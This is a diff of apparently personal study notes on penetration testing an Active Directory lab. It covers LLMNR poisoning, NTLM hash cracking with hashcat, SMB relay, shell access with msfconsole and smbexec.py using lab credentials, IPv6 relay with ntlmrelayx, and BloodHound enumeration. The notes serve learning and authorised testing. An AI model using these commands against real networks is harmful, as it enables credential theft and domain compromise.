@@ -1,5 +1,7 @@
 Pen testing an internal AD network
 
+-----------------------------------------------------------------------------------------------------------------------------
+
 1. LLMNR Poisoning
 
 link-local multicast name resolution (LLMNR) 
@@ -14,6 +16,8 @@ once responder picks up a username and hash, we can make use of hashcat or other
 Make sure to put the username and hash in a file. check hashcat --help to find the module for the type of hash you need to crack. NTLM is the standard Windows hash and the module for that is 5600. 
 hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt
 If you need another password list, google "password seclist".
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
 
 2. SMB Relay
 
@@ -53,6 +57,8 @@ use ADMIN$
 will give us access to the Systems folder. 
 Note, there are additional methods we can use rather than just the interactive shell in the relay command. We could create a meterpreter shell or get the relay to run a command (think Powershell).
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
 3. Gaining Shell Access
 
 If we have local users, then we can use msfconsole to gain a shell. Note, this is based on the username and password we cracked earlier in LLMNR. 
@@ -87,6 +93,8 @@ or
 
 syntax: smbexec.py marvel.local/fcastle:Password1@10.0.1.6
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
 4. IPv6 Attacks
 
 Most networks are still running on IPv4, but IPv6 is enabled and all machines also get an IPv6 IP. However, who is doing the DNS for IPv6? The answer is no one and this provides us with the opportunity to do a Man in the Middle attack against IPv6. 
@@ -99,6 +107,8 @@ then we need a relay:
 sudo ntlmrelayx.py -6 -t ldaps://10.0.1.4 -wh fakewpad.marvel.local -l lootme (most Domain Controls have the certificate installed, so LDAP Secure is good, we are doimg this on IPv6, hence the 6). 
 
 if you go to the lootme folder on Kali, once a computer has been rebooted or some time has passed, then you should see all sorts of interesting information. 
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
 
 5. Post Exploitation Enumeration
 
@@ -173,4 +183,9 @@ syntax: . .\SharpHound.ps1
 syntax: Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN> ZipFileName file.zip
 Once this has finished, we need to copy it across to our Kali machine and import it into BloodHound. One could use the SMB share or install WinCP on the Windows machine to achieve this. 
 Once copied across, go to BloodHound and click on the upload data icon on the right hand side. Then, select the file and let is import. Once done, go to the left hand side and check the data. Then, look through the Analysis tab for all the built-in queries. 
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+6. Post Compromise Attacks
+
 
